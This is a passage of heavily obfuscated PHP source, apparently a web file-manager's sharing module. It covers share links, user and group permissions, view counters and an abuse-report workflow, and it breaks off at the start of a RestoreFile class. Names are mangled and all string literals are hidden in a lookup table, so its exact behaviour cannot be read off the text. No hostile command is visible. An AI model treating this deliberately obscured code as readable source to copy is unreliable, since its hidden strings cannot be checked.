$this->shareSourceInfo($ø“é¹á); } private function shareSourceInfo($¦Æî’½™) { $Ò§¶Û‹° =& $_SERVER[øşô´çË]; if (!is_array($¦Æî’½™)) { return $¦Æî’½™; } if ($¦Æî’½™[$Ò§¶Û‹°[201]] == $Ò§¶Û‹°[238]) { $¦Æî’½™[$Ò§¶Û‹°[100]] = IO::info($¦Æî’½™[$Ò§¶Û‹°[592]]); } else { $¦Æî’½™[$Ò§¶Û‹°[100]] = Model($Ò§¶Û‹°[1529])->pathInfo($¦Æî’½™[$Ò§¶Û‹°[201]]); } return $¦Æî’½™; } protected function getInfoAuth($¶ïéıëÈ) { $Åª±°š =& $_SERVER[øşô´çË]; $¼îÅĞÁ = $this->getInfo($¶ïéıëÈ); if ($¼îÅĞÁ[$Åª±°š[1588]] == USER_ID) { $¼îÅĞÁ[$Åª±°š[511]] = $¼îÅĞÁ[$Åª±°š[100]][$Åª±°š[511]]; } else { $¼îÅĞÁ[$Åª±°š[511]] = Model($Åª±°š[596])->authMake($¼îÅĞÁ[$Åª±°š[1546]]); } return $¼îÅĞÁ; } protected function listData($İÅ²¶¨ = null, $´á¡­§• = 300) { $½İ¼Ñì =& $_SERVER[øşô´çË]; $Ç¸¿„‚ = array(array($½İ¼Ñì[587] => array($½İ¼Ñì[1176], 0), $½İ¼Ñì[694] => array($½İ¼Ñì[1176], 0), $½İ¼Ñì[2324] => $½İ¼Ñì[2280])); if ($İÅ²¶¨ == $½İ¼Ñì[2325]) { $Ç¸¿„‚ = array($½İ¼Ñì[587] => 1); } else { if ($İÅ²¶¨ == $½İ¼Ñì[1343]) { $Ç¸¿„‚ = array($½İ¼Ñì[694] => 1); } } $Ç¸¿„‚[$½İ¼Ñì[1588]] = USER_ID; $ÅÓ¥î = $this->where($Ç¸¿„‚)->selectPage($´á¡­§•); return $ÅÓ¥î; } protected function listToMe($äŞõÛ­¸ = 300) { $† ­Ôİ… =& $_SERVER[øşô´çË]; $˜­Ãš = Model($† ­Ôİ…[2326])->userGroupParents(USER_ID); $ĞÅ®ú…ã = array($† ­Ôİ…[679] => SourceModel::TYPE_USER, $† ­Ôİ…[598] => USER_ID); if ($˜­Ãš) { $ĞÅ®ú…ã = array(array($† ­Ôİ…[679] => SourceModel::TYPE_USER, $† ­Ôİ…[598] => USER_ID), array($† ­Ôİ…[679] => SourceModel::TYPE_GROUP, $† ­Ôİ…[598] => array($† ­Ôİ…[7], $˜­Ãš)), $† ­Ôİ…[2324] => $† ­Ôİ…[2280]); } $…Å³á­’ = Model($† ­Ôİ…[697])->field($† ­Ôİ…[696])->where($ĞÅ®ú…ã)->select(); $…Å³á­’ = array_unique(array_to_keyvalue($…Å³á­’, $† ­Ôİ…[12], $† ­Ôİ…[696])); $ĞÅ®ú…ã = array($† ­Ôİ…[696] => array($† ­Ôİ…[516], $…Å³á­’)); if (!$…Å³á­’) { return array($† ­Ôİ…[455] => array(), $† ­Ôİ…[452] => array($† ­Ôİ…[2327] => 0, $† ­Ôİ…[437] => 1)); } $ó†°ÄÔ× = Model($† ­Ôİ…[697])->where($ĞÅ®ú…ã)->select(); $ó†°ÄÔ× = array_to_keyvalue_group($ó†°ÄÔ×, $† ­Ôİ…[696]); $‡ŸƒÙïè = $† ­Ôİ…[2328]; $Ôæ»“§í = $this->field($‡ŸƒÙïè)->where($ĞÅ®ú…ã)->selectPage($äŞõÛ­¸); foreach ($Ôæ»“§í[$† ­Ôİ…[455]] as $õÖÏ‡Òã => &$ĞÊšœİı) { $ĞÊšœİı[$† ­Ôİ…[1546]] = $ó†°ÄÔ×[$ĞÊšœİı[$† ­Ôİ…[696]]]; } unset($ĞÊšœİı); return $Ôæ»“§í; } protected function shareAdd($›İ®ñëõ, $İ•Æ¨Óé) { $ËÎÆÄÂ– =& $_SERVER[øşô´çË]; $çÜ–×İ‚ = $this->_addShareData($›İ®ñëõ, $İ•Æ¨Óé); if (!empty($İ•Æ¨Óé[$ËÎÆÄÂ–[2329]])) { $this->_shareAuthSet($çÜ–×İ‚, $İ•Æ¨Óé[$ËÎÆÄÂ–[2329]]); } $this->shareEventAdd($›İ®ñëõ, $İ•Æ¨Óé, $ËÎÆÄÂ–[2330]); return $çÜ–×İ‚; } protected function shareAddSystem($ÍíıÚë, $»™ÆÁÀ†) { $ÈÛÊ¹ê =& $_SERVER[øşô´çË]; $¸¬¨€è = $this->_addShareData($ÍíıÚë, $»™ÆÁÀ†, $ÈÛÊ¹ê[199]); $this->_shareAuthSet($¸¬¨€è, $»™ÆÁÀ†[$ÈÛÊ¹ê[2329]]); return $¸¬¨€è; } private function shareEventAdd($»¬µëÑ, $˜ùìÕíí, $÷â¶°´ = "\x61\x64\144") { $Ş°‡û“› =& $_SERVER[øşô´çË]; if (!$»¬µëÑ || $»¬µëÑ == $Ş°‡û“›[238]) { return; } if ($÷â¶°´ == $Ş°‡û“›[2330]) { if ($˜ùìÕíí[$Ş°‡û“›[587]] == $Ş°‡û“›[101]) { Model($Ş°‡û“›[664])->eventShare($»¬µëÑ, $Ş°‡û“›[2331]); } if ($˜ùìÕíí[$Ş°‡û“›[694]] == $Ş°‡û“›[101]) { Model($Ş°‡û“›[664])->eventShare($»¬µëÑ, $Ş°‡û“›[2332]); } return; } $›ÓÁäÄ = $this->getInfoByPath($»¬µëÑ); $Õœêí‡’ = $Ş°‡û“›[2333]; if ($›ÓÁäÄ[$Ş°‡û“›[587]] == $Ş°‡û“›[238] && $˜ùìÕíí[$Ş°‡û“›[587]] == $Ş°‡û“›[101]) { $Õœêí‡’ = $Ş°‡û“›[2331]; } if ($›ÓÁäÄ[$Ş°‡û“›[587]] == $Ş°‡û“›[101] && $˜ùìÕíí[$Ş°‡û“›[587]] == $Ş°‡û“›[238]) { $Õœêí‡’ = $Ş°‡û“›[2334]; } if ($›ÓÁäÄ[$Ş°‡û“›[694]] == $Ş°‡û“›[238] && $˜ùìÕíí[$Ş°‡û“›[694]] == $Ş°‡û“›[101]) { $Õœêí‡’ = $Ş°‡û“›[2332]; } if ($›ÓÁäÄ[$Ş°‡û“›[694]] == $Ş°‡û“›[101] && $˜ùìÕíí[$Ş°‡û“›[694]] == $Ş°‡û“›[238]) { $Õœêí‡’ = $Ş°‡û“›[2335]; } Model($Ş°‡û“›[664])->eventShare($»¬µëÑ, $Õœêí‡’); return; } private function _addShareData($¦ÓÌ·, $Àç¡­Ê = array(), $Üƒ“õ±÷ = false) { $–ÇÖıÅ =& $_SERVER[øşô´çË]; $şüµ÷äŸ = $Üƒ“õ±÷ == $–ÇÖıÅ[199] ? 0 : USER_ID; $è×Á–¡ = array($–ÇÖıÅ[515] => $¦ÓÌ·, $–ÇÖıÅ[1964] => $şüµ÷äŸ); if ($¦ÓÌ· == 0) { $è×Á–¡ = array($–ÇÖıÅ[2336] => $Àç¡­Ê[$–ÇÖıÅ[592]], $–ÇÖıÅ[1964] => $şüµ÷äŸ); } if ($šÓ»ó° = $this->where($è×Á–¡)->find()) { return $šÓ»ó°[$–ÇÖıÅ[696]]; } if ($¦ÓÌ· == 0) { $§Ìî†”› = array($–ÇÖıÅ[42] => get_path_this($Àç¡­Ê[$–ÇÖıÅ[97]])); } else { $§Ìî†”› = Model($–ÇÖıÅ[935])->sourceInfo($¦ÓÌ·); if (!$§Ìî†”›) { return !1; } } if (!$Àç¡­Ê[$–ÇÖıÅ[1862]]) { $Àç¡­Ê[$–ÇÖıÅ[1862]] = $§Ìî†”›[$–ÇÖıÅ[42]]; } $ûä›œ¾£ = array($–ÇÖıÅ[1964] => $şüµ÷äŸ, $–ÇÖıÅ[515] => $¦ÓÌ·, $–ÇÖıÅ[1862] => $–ÇÖıÅ[12], $–ÇÖıÅ[587] => 0, $–ÇÖıÅ[694] => 0, $–ÇÖıÅ[592] => $–ÇÖıÅ[12], $–ÇÖıÅ[391] => $–ÇÖıÅ[12], $–ÇÖıÅ[1047] => $–ÇÖıÅ[12], $–ÇÖıÅ[2337] => 0, $–ÇÖıÅ[2338] => 0, $–ÇÖıÅ[864] => 0, $–ÇÖıÅ[589] => $–ÇÖıÅ[12], $–ÇÖıÅ[1550] => $–ÇÖıÅ[12]); $³á·×Ã = explode($–ÇÖıÅ[60], $–ÇÖıÅ[2339]); foreach ($³á·×Ã as $ü±Æó§) { if (!isset($Àç¡­Ê[$ü±Æó§])) { continue; } $ûä›œ¾£[$ü±Æó§] = $Àç¡­Ê[$ü±Æó§]; } $†Ôë—Ş¿ = $this->add($ûä›œ¾£); $Ö´È‚Í = array($–ÇÖıÅ[1550] => short_id($†Ôë—Ş¿)); if ($this->where($Ö´È‚Í)->find()) { $Ö´È‚Í[$–ÇÖıÅ[1550]] .= $–ÇÖıÅ[485] . rand_string(2, 3); } $this->where(array($–ÇÖıÅ[2340] => $†Ôë—Ş¿))->save($Ö´È‚Í); return $†Ôë—Ş¿; } private function _shareAuthSet($Èè³µ„û, $ĞŠÊµ) { $¢‘ØâØ‘ =& $_SERVER[øşô´çË]; if (!is_array($ĞŠÊµ)) { return !1; } $ø¶‰ƒ­ = Model($¢‘ØâØ‘[2289]); $ø¶‰ƒ­->where(array($¢‘ØâØ‘[696] => $Èè³µ„û))->delete(); $Æ¯­–Äï = array(); foreach ($ĞŠÊµ as $ØáàãÙÃ) { $¢ê“³½ù = SourceModel::TYPE_USER; if ($ØáàãÙÃ[$¢‘ØâØ‘[198]] == SourceModel::TYPE_GROUP) { $¢ê“³½ù = SourceModel::TYPE_GROUP; } $©ìã…ìˆ = array($¢‘ØâØ‘[696] => $Èè³µ„û, $¢‘ØâØ‘[198] => $¢ê“³½ù, $¢‘ØâØ‘[598] => intval($ØáàãÙÃ[$¢‘ØâØ‘[598]]), $¢‘ØâØ‘[1636] => 0, $¢‘ØâØ‘[2341] => -1); if ($ØáàãÙÃ[$¢‘ØâØ‘[1636]]) { $©ìã…ìˆ[$¢‘ØâØ‘[1636]] = $ØáàãÙÃ[$¢‘ØâØ‘[1636]]; } else { if ($ØáàãÙÃ[$¢‘ØâØ‘[2341]]) { $©ìã…ìˆ[$¢‘ØâØ‘[2341]] = $ØáàãÙÃ[$¢‘ØâØ‘[2341]]; } } $Æ¯­–Äï[] = $©ìã…ìˆ; } return $ø¶‰ƒ­->addAll($Æ¯­–Äï, array(), !0); } public function numViewAdd($–ïÜ‡ä“) { $äè¼”ƒÃ =& $_SERVER[øşô´çË]; $€œ­„¤² = array($äè¼”ƒÃ[2340] => $–ïÜ‡ä“); $this->where($€œ­„¤²)->setAdd($äè¼”ƒÃ[2337]); } public function numDownloadAdd($¥òÊ¹ß€) { $°Öˆğ¢ =& $_SERVER[øşô´çË]; $À ÂÕª‡ = array($°Öˆğ¢[2340] => $¥òÊ¹ß€); $this->where($À ÂÕª‡)->setAdd($°Öˆğ¢[2338]); } protected function shareEdit($õŠ×Ú”å, $‘ëÄÙş) { $¾™Œ­Ö¥ =& $_SERVER[øşô´çË]; $¤Ø‹ÁËË = $this->getInfo($õŠ×Ú”å); if (!$¤Ø‹ÁËË) { return !1; } if ($‘ëÄÙş[$¾™Œ­Ö¥[1550]] && $‘ëÄÙş[$¾™Œ­Ö¥[587]] == $¾™Œ­Ö¥[101]) { if ($‘ëÄÙş[$¾™Œ­Ö¥[1550]] == $¤Ø‹ÁËË[$¾™Œ­Ö¥[1550]]) { unset($‘ëÄÙş[$¾™Œ­Ö¥[1550]]); } if ($‘ëÄÙş[$¾™Œ­Ö¥[1550]]) { $˜ï€ïâ = $this->where(array($¾™Œ­Ö¥[2342] => $‘ëÄÙş[$¾™Œ­Ö¥[1550]]))->find(); if ($˜ï€ïâ) { return !1; } if (!is_array($‘ëÄÙş[$¾™Œ­Ö¥[589]])) { $‘ëÄÙş[$¾™Œ­Ö¥[589]] = is_array($¤Ø‹ÁËË[$¾™Œ­Ö¥[589]]) ? $¤Ø‹ÁËË[$¾™Œ­Ö¥[589]] : array(); } if (!$‘ëÄÙş[$¾™Œ­Ö¥[589]][$¾™Œ­Ö¥[2343]]) { $‘ëÄÙş[$¾™Œ­Ö¥[589]][$¾™Œ­Ö¥[2343]] = $¤Ø‹ÁËË[$¾™Œ­Ö¥[1550]]; $‘ëÄÙş[$¾™Œ­Ö¥[589]][$¾™Œ­Ö¥[2344]] = $¾™Œ­Ö¥[101]; } } } $this->_checkLinkShare($‘ëÄÙş, $¤Ø‹ÁËË); $¢†Æó¡ = array(); $õı½½¦¨ = explode($¾™Œ­Ö¥[60], $¾™Œ­Ö¥[2345]); foreach ($õı½½¦¨ as $áË¿­) { if (!array_key_exists($áË¿­, $‘ëÄÙş)) { continue; } $¢†Æó¡[$áË¿­] = $‘ëÄÙş[$áË¿­]; } $this->shareEventAdd($¤Ø‹ÁËË[$¾™Œ­Ö¥[201]], $‘ëÄÙş, $¾™Œ­Ö¥[1557]); $this->where(array($¾™Œ­Ö¥[2340] => $õŠ×Ú”å))->save($¢†Æó¡); if (isset($‘ëÄÙş[$¾™Œ­Ö¥[2329]])) { $this->_shareAuthSet($õŠ×Ú”å, $‘ëÄÙş[$¾™Œ­Ö¥[2329]]); } return !0; } private function _checkLinkShare($—ŸöÄĞí, $‹µø´«¡) { $æåÁÔá‡ =& $_SERVER[øşô´çË]; if ($—ŸöÄĞí[$æåÁÔá‡[587]] != $æåÁÔá‡[101]) { return; } $Šö÷Ï‘‡ = $‹µø´«¡[$æåÁÔá‡[100]][$æåÁÔá‡[201]]; if ($‹µø´«¡[$æåÁÔá‡[100]][$æåÁÔá‡[43]] != $æåÁÔá‡[240]) { $ïªÌõ¹¸ = $this->_folderReport($Šö÷Ï‘‡); if (!$ïªÌõ¹¸) { return; } show_json(LNG($æåÁÔá‡[2346]) . $æåÁÔá‡[2347] . $ïªÌõ¹¸, !1); } $ñ·ôÄ¼º = Model($æåÁÔá‡[935])->fileInfoGet($‹µø´«¡[$æåÁÔá‡[100]][$æåÁÔá‡[201]]); if (!$ñ·ôÄ¼º) { return; } $ñ™Ç÷Èø = $this->shareFileMeta($ñ·ôÄ¼º[$æåÁÔá‡[566]]); if (isset($ñ™Ç÷Èø[$æåÁÔá‡[460]]) && $ñ™Ç÷Èø[$æåÁÔá‡[460]] == $æåÁÔá‡[101]) { show_json(LNG($æåÁÔá‡[2348]), !1); } } private function _folderReport($–¾×ôã) { $‰ÍÇôÊØ =& $_SERVER[øşô´çË]; $®ÄŠ —ù = array($‰ÍÇôÊØ[566] => array($‰ÍÇôÊØ[1176], 0), $‰ÍÇôÊØ[852] => 3); $Ûı²Ù÷ = Model($‰ÍÇôÊØ[2349])->where($®ÄŠ —ù)->field($‰ÍÇôÊØ[566])->select(); if (!$Ûı²Ù÷) { return !1; } $Ûı²Ù÷ = array_to_keyvalue($Ûı²Ù÷, $‰ÍÇôÊØ[12], $‰ÍÇôÊØ[566]); $ü²¶ÑÚ = $‰ÍÇôÊØ[60] . $–¾×ôã . $‰ÍÇôÊØ[60]; $®ÄŠ —ù = array($‰ÍÇôÊØ[566] => array($‰ÍÇôÊØ[7], $Ûı²Ù÷), $‰ÍÇôÊØ[613] => array($‰ÍÇôÊØ[482], "\x25{$ü²¶ÑÚ}\45"), $‰ÍÇôÊØ[529] => 0); $ÉŒ®–õï = Model($‰ÍÇôÊØ[935])->where($®ÄŠ —ù)->field($‰ÍÇôÊØ[2350])->find(); if (!$ÉŒ®–õï) { return !1; } $Ç´ûö­Ì = substr($ÉŒ®–õï[$‰ÍÇôÊØ[613]], strpos($ÉŒ®–õï[$‰ÍÇôÊØ[613]], $ü²¶ÑÚ)); $®ÄŠ —ù = array($‰ÍÇôÊØ[201] => array($‰ÍÇôÊØ[7], trim($Ç´ûö­Ì, $‰ÍÇôÊØ[60]))); $²œ˜·Æê = Model($‰ÍÇôÊØ[935])->where($®ÄŠ —ù)->field($‰ÍÇôÊØ[42])->select(); $Ö›óèÓ‚ = array_to_keyvalue($²œ˜·Æê, $‰ÍÇôÊØ[12], $‰ÍÇôÊØ[42]); $Ö›óèÓ‚[] = $ÉŒ®–õï[$‰ÍÇôÊØ[42]]; return implode($‰ÍÇôÊØ[8], $Ö›óèÓ‚); } protected function remove($…äºùèœ) { $‚ß¦¿ƒ“ =& $_SERVER[øşô´çË]; $Ñ›ßØôø = is_array($…äºùèœ) ? $…äºùèœ : array($…äºùèœ); for ($¦¶ü¶şô = 0; $¦¶ü¶şô < count($Ñ›ßØôø); $¦¶ü¶şô++) { $Í™Ÿ÷¾µ = $this->getInfo($Ñ›ßØôø[$¦¶ü¶şô]); if ($Í™Ÿ÷¾µ[$‚ß¦¿ƒ“[694]] == $‚ß¦¿ƒ“[101]) { Model($‚ß¦¿ƒ“[664])->eventShare($Í™Ÿ÷¾µ[$‚ß¦¿ƒ“[201]], $‚ß¦¿ƒ“[2335]); } if ($Í™Ÿ÷¾µ[$‚ß¦¿ƒ“[587]] == $‚ß¦¿ƒ“[101]) { Model($‚ß¦¿ƒ“[664])->eventShare($Í™Ÿ÷¾µ[$‚ß¦¿ƒ“[201]], $‚ß¦¿ƒ“[2334]); } } $ç©æ€÷á = array($‚ß¦¿ƒ“[696] => array($‚ß¦¿ƒ“[7], $Ñ›ßØôø)); $ú…¬œâ¦ = $this->where($ç©æ€÷á)->delete(); if ($ú…¬œâ¦) { Model($‚ß¦¿ƒ“[697])->where($ç©æ€÷á)->delete(); } return $ú…¬œâ¦; } protected function removeBySource($à¡Š“üÏ) { $À–÷†À =& $_SERVER[øşô´çË]; $›×½ÏÃ¬ = array($À–÷†À[515] => array($À–÷†À[516], $à¡Š“üÏ)); $¿¨Í¥ªƒ = $this->field($À–÷†À[696])->where($›×½ÏÃ¬)->select(); $ˆ¬—‚Ï = array_to_keyvalue($¿¨Í¥ªƒ, $À–÷†À[12], $À–÷†À[696]); if (!$ˆ¬—‚Ï) { return; } foreach ($¿¨Í¥ªƒ as $ÎªšÍ–õ) { $this->cacheFunctionClear($À–÷†À[2351], $ÎªšÍ–õ[$À–÷†À[696]]); } $›×½ÏÃ¬ = array($À–÷†À[2340] => array($À–÷†À[516], $ˆ¬—‚Ï)); $this->where($›×½ÏÃ¬)->delete(); Model($À–÷†À[697])->where($›×½ÏÃ¬)->delete(); } public function listAll($÷‡øæˆÔ) { $¿ÎŠÜüê =& $_SERVER[øşô´çË]; $¯üÓØÊ = array(); if ($÷‡øæˆÔ[$¿ÎŠÜüê[1588]]) { $¯üÓØÊ[$¿ÎŠÜüê[1588]] = $÷‡øæˆÔ[$¿ÎŠÜüê[1588]]; } if ($÷‡øæˆÔ[$¿ÎŠÜüê[863]]) { $èÔ¿€ãø = $÷‡øæˆÔ[$¿ÎŠÜüê[864]] ? $÷‡øæˆÔ[$¿ÎŠÜüê[864]] : strtotime(date($¿ÎŠÜüê[2352])); $¯üÓØÊ[$¿ÎŠÜüê[241]] = array($¿ÎŠÜüê[417], array($÷‡øæˆÔ[$¿ÎŠÜüê[863]], $èÔ¿€ãø)); } if ($÷‡øæˆÔ[$¿ÎŠÜüê[43]]) { $¯üÓØÊ[$÷‡øæˆÔ[$¿ÎŠÜüê[43]]] = 1; } else { $¯üÓØÊ[] = array($¿ÎŠÜüê[587] => array($¿ÎŠÜüê[1176], 0), $¿ÎŠÜüê[694] => array($¿ÎŠÜüê[1176], 0), $¿ÎŠÜüê[2324] => $¿ÎŠÜüê[2280]); } if ($÷‡øæˆÔ[$¿ÎŠÜüê[2276]]) { $¯üÓØÊ[] = array($¿ÎŠÜüê[1550] => $÷‡øæˆÔ[$¿ÎŠÜüê[2276]], $¿ÎŠÜüê[1862] => array($¿ÎŠÜüê[482], "\45{$÷‡øæˆÔ[$¿ÎŠÜüê[2276]]}\x25"), $¿ÎŠÜüê[2324] => $¿ÎŠÜüê[2280]); } $Ï•Ø´Ù = $this->_makeOrder()->where($¯üÓØÊ)->selectPage(20); if (empty($Ï•Ø´Ù[$¿ÎŠÜüê[455]])) { return array(); } $this->_listDataApply($Ï•Ø´Ù[$¿ÎŠÜüê[455]]); return $Ï•Ø´Ù; } public function listDataApply($ØìÃ¬Æ–) { $this->_listDataApply($ØìÃ¬Æ–); return $ØìÃ¬Æ–; } private function _listDataApply(&$»¹ÑÁ“ã) { $Ú…µó»õ =& $_SERVER[øşô´çË]; $ƒÊŞµµ = array_to_keyvalue($»¹ÑÁ“ã, $Ú…µó»õ[12], $Ú…µó»õ[1588]); $‚£·¢¿² = Model($Ú…µó»õ[626])->userListInfo(array_unique($ƒÊŞµµ)); $®”·•ÄÌ = array_to_keyvalue($»¹ÑÁ“ã, $Ú…µó»õ[12], $Ú…µó»õ[201]); $ªÚä°ß´ = Model($Ú…µó»õ[935])->sourceListInfo($®”·•ÄÌ, !0); foreach ($»¹ÑÁ“ã as $ô¾ÔÆëº => &$Ù©£ê³³) { $®§à¥³ = $Ù©£ê³³[$Ú…µó»õ[1588]]; $Ù©£ê³³[$Ú…µó»õ[2353]] = $‚£·¢¿²[$®§à¥³] ? $‚£·¢¿²[$®§à¥³] : !1; if (!$Ù©£ê³³[$Ú…µó»õ[2353]] || $Ù©£ê³³[$Ú…µó»õ[2353]][$Ú…µó»õ[852]] != $Ú…µó»õ[101]) { unset($»¹ÑÁ“ã[$ô¾ÔÆëº]); continue; } $Ğ¢º¤ˆœ = $Ù©£ê³³[$Ú…µó»õ[201]]; $Ù©£ê³³[$Ú…µó»õ[100]] = $ªÚä°ß´[$Ğ¢º¤ˆœ] ? $ªÚä°ß´[$Ğ¢º¤ˆœ] : !1; if ($Ù©£ê³³[$Ú…µó»õ[100]][$Ú…µó»õ[529]] == $Ú…µó»õ[101]) { unset($»¹ÑÁ“ã[$ô¾ÔÆëº]); } if ($Ù©£ê³³[$Ú…µó»õ[100]] != $Ú…µó»õ[238] && !$Ù©£ê³³[$Ú…µó»õ[100]]) { unset($»¹ÑÁ“ã[$ô¾ÔÆëº]); } } unset($Ù©£ê³³); $»¹ÑÁ“ã = array_values($»¹ÑÁ“ã); } private function _makeOrder($¨û­€Ä™ = '') { $öô©şÔ =& $_SERVER[øşô´çË]; $é¹Ö™äå = array($öô©şÔ[241], $öô©şÔ[864], $öô©şÔ[2337], $öô©şÔ[2338]); $³£ÁşüÃ = array($öô©şÔ[546] => $öô©şÔ[547], $öô©şÔ[548] => $öô©şÔ[549]); $‘§¢°Ğ„ = Input::get($öô©şÔ[553], $öô©şÔ[7], $öô©şÔ[521], $é¹Ö™äå); $ï‡‘”­Õ = Input::get($öô©şÔ[554], $öô©şÔ[7], $öô©şÔ[2354], array($öô©şÔ[2273], $öô©şÔ[548])); $ï‡‘”­Õ = $³£ÁşüÃ[$ï‡‘”­Õ]; $¨û­€Ä™ = $¨û­€Ä™ . "{$‘§¢°Ğ„}\x20{$ï‡‘”­Õ}"; return $this->order($¨û­€Ä™); } public function reportAdd($‚¿ãÉ¯) { $á”„À³Ø =& $_SERVER[øşô´çË]; $‚ÌæÎı· = array($á”„À³Ø[696] => $‚¿ãÉ¯[$á”„À³Ø[696]], $á”„À³Ø[1588] => USER_ID); if (Model($á”„À³Ø[2349])->where($‚ÌæÎı·)->find()) { return !1; } $•¸Üçê = array($á”„À³Ø[696] => $‚¿ãÉ¯[$á”„À³Ø[696]], $á”„À³Ø[1862] => $‚¿ãÉ¯[$á”„À³Ø[1862]], $á”„À³Ø[201] => $‚¿ãÉ¯[$á”„À³Ø[201]], $á”„À³Ø[566] => $‚¿ãÉ¯[$á”„À³Ø[566]], $á”„À³Ø[1588] => USER_ID, $á”„À³Ø[43] => $‚¿ãÉ¯[$á”„À³Ø[43]], $á”„À³Ø[549] => $‚¿ãÉ¯[$á”„À³Ø[549]]); return Model($á”„À³Ø[2349])->add($•¸Üçê); } public function reportList($¡Ü™ÅÈ½) { $Âö™«°´ =& $_SERVER[øşô´çË]; $µ¡ÖüÚ = array(); if ($¡Ü™ÅÈ½[$Âö™«°´[863]]) { $ä°‘áŸß = $¡Ü™ÅÈ½[$Âö™«°´[864]] ? $¡Ü™ÅÈ½[$Âö™«°´[864]] : strtotime(date($Âö™«°´[2352])); $µ¡ÖüÚ[$Âö™«°´[241]] = array($Âö™«°´[417], array($¡Ü™ÅÈ½[$Âö™«°´[863]], $ä°‘áŸß)); } if (isset($¡Ü™ÅÈ½[$Âö™«°´[43]]) && in_array($¡Ü™ÅÈ½[$Âö™«°´[43]], array($Âö™«°´[101], $Âö™«°´[533], $Âö™«°´[2355], $Âö™«°´[2356], $Âö™«°´[2357]))) { $µ¡ÖüÚ[$Âö™«°´[43]] = $¡Ü™ÅÈ½[$Âö™«°´[43]]; } if (isset($¡Ü™ÅÈ½[$Âö™«°´[852]]) && in_array($¡Ü™ÅÈ½[$Âö™«°´[852]], array($Âö™«°´[238], $Âö™«°´[101], $Âö™«°´[533], $Âö™«°´[2355]))) { $µ¡ÖüÚ[$Âö™«°´[852]] = $¡Ü™ÅÈ½[$Âö™«°´[852]]; } $­¹´í†é = Input::get($Âö™«°´[554], $Âö™«°´[7], $Âö™«°´[2354], array($Âö™«°´[2273], $Âö™«°´[548])); $Îòãš®â = array($Âö™«°´[546] => $Âö™«°´[547], $Âö™«°´[548] => $Âö™«°´[549]); $œêüéæ½ = $Âö™«°´[2358] . $Îòãš®â[$­¹´í†é]; $Ï½ìşò„ = Model($Âö™«°´[2349])->where($µ¡ÖüÚ)->order($œêüéæ½)->selectPage(20); if (empty($Ï½ìşò„[$Âö™«°´[455]])) { return array(); } $¿¤¿İµı = array_to_keyvalue_group($Ï½ìşò„[$Âö™«°´[455]], $Âö™«°´[852], $Âö™«°´[696]); if (!empty($¿¤¿İµı[0])) { $¡Ü™ÅÈ½ = $¿¤¿İµı[0]; $µ¡ÖüÚ = array($Âö™«°´[696] => array($Âö™«°´[7], $¡Ü™ÅÈ½)); $‚Ë‰† = $this->where($µ¡ÖüÚ)->field($Âö™«°´[696])->select(); $‚Ë‰† = array_to_keyvalue($‚Ë‰†, $Âö™«°´[12], $Âö™«°´[696]); $Ô¦¯ÀÄ˜ = array_diff($¡Ü™ÅÈ½, $‚Ë‰†); if (!empty($Ô¦¯ÀÄ˜)) { foreach ($Ï½ìşò„[$Âö™«°´[455]] as $õ°¨–‹˜ => $“‚Ûşúü) { if (in_array($“‚Ûşúü[$Âö™«°´[696]], $Ô¦¯ÀÄ˜)) { unset($Ï½ìşò„[$Âö™«°´[455]][$õ°¨–‹˜]); } } } } $this->_listDataApply($Ï½ìşò„[$Âö™«°´[455]]); return $Ï½ìşò„; } public function reportStatus($Áõãºİ) { $§î¾ø¯Œ =& $_SERVER[øşô´çË]; $¥ƒÉ¹µ = array($§î¾ø¯Œ[496] => $Áõãºİ[$§î¾ø¯Œ[496]]); $ŒçïçŠ = Model($§î¾ø¯Œ[2349])->where($¥ƒÉ¹µ)->field($§î¾ø¯Œ[2359])->find(); if (!$ŒçïçŠ) { return !1; } $Ó°öÂ™› = array($§î¾ø¯Œ[852] => $Áõãºİ[$§î¾ø¯Œ[852]]); if ($Áõãºİ[$§î¾ø¯Œ[852]] == $§î¾ø¯Œ[2355] && $ŒçïçŠ[$§î¾ø¯Œ[852]] == $§î¾ø¯Œ[2355]) { $Ó°öÂ™›[$§î¾ø¯Œ[852]] = 0; } $¾ÁÊê“Â = Model($§î¾ø¯Œ[2349])->where($¥ƒÉ¹µ)->save($Ó°öÂ™›); if ($Áõãºİ[$§î¾ø¯Œ[852]] == $§î¾ø¯Œ[533]) { if ($ŒçïçŠ[$§î¾ø¯Œ[566]] != $§î¾ø¯Œ[238] && $this->shareFileMeta($ŒçïçŠ[$§î¾ø¯Œ[566]])) { $this->shareFileMeta($ŒçïçŠ[$§î¾ø¯Œ[566]], 0); } $this->remove($ŒçïçŠ[$§î¾ø¯Œ[696]]); return !0; } if ($¾ÁÊê“Â && $Áõãºİ[$§î¾ø¯Œ[852]] == $§î¾ø¯Œ[2355]) { $èì¢È£Ù = $Ó°öÂ™›[$§î¾ø¯Œ[852]] == $§î¾ø¯Œ[2355] ? 1 : 0; $this->shareFileMeta($ŒçïçŠ[$§î¾ø¯Œ[566]], $èì¢È£Ù); $this->removeByFile($ŒçïçŠ[$§î¾ø¯Œ[566]]); } return $¾ÁÊê“Â; } private function removeByFile($†ñò–Œ) { $³ş¶¤á =& $_SERVER[øşô´çË]; $Œä­¦Õ = Model($³ş¶¤á[935])->where(array($³ş¶¤á[566] => $†ñò–Œ))->field($³ş¶¤á[201])->select(); $ŠÁ¼ğ = array_to_keyvalue($Œä­¦Õ, $³ş¶¤á[12], $³ş¶¤á[201]); $­€¿¡ç = array($³ş¶¤á[201] => array($³ş¶¤á[7], $ŠÁ¼ğ), $³ş¶¤á[587] => 1); $Œä­¦Õ = $this->where($­€¿¡ç)->field($³ş¶¤á[696])->select(); if (empty($Œä­¦Õ)) { return; } $¢Åìí¦† = array_to_keyvalue($Œä­¦Õ, $³ş¶¤á[12], $³ş¶¤á[696]); $this->remove($¢Åìí¦†); } private function shareFileMeta($ÛÍ÷ûüŞ, $¢ÁßâÂß = null) { $ü©ÇÀ“ =& $_SERVER[øşô´çË]; $ğŸÉĞô… = array($ü©ÇÀ“[566] => $ÛÍ÷ûüŞ, $ü©ÇÀ“[105] => $ü©ÇÀ“[2360]); if (is_null($¢ÁßâÂß)) { return Model($ü©ÇÀ“[2361])->where($ğŸÉĞô…)->find(); } $ğŸÉĞô…[$ü©ÇÀ“[460]] = $¢ÁßâÂß; Model($ü©ÇÀ“[2361])->add($ğŸÉĞô…, array(), !0); } } goto a§ìø°¦÷ë; f…íáóæ£: class RestoreFile { public $message; public function __construct() { } public function start($şş„Ëä¨) { $ï¶õ˜î =& $_SERVER[øşô´çË]; $ÒÑ˜¡ùÕ = Model($ï¶õ˜î[875]); if ($ÒÑ˜¡ùÕ->get($ï¶õ˜î[963]) == $ï¶õ˜î[964]) { $this->message = 